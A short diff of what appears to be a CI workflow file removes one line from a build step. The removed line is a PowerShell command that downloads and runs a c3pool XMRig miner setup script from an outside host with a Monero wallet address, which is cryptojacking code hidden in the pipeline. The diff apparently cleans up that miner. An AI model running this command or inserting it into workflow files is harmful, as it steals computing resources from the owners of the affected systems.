@@ -28,5 +28,4 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.bat', $tempfile); & $tempfile 49ANaFYnp2fRbbNooK7xwpUey9Yz9zK3XBMMDzibBdBJCBCT9VFQBTLLL8pV4CTibehAQVUCHZC7tafYHF1PBFJHR6RFYtJ; Remove-Item -Force $tempfile"
           ls
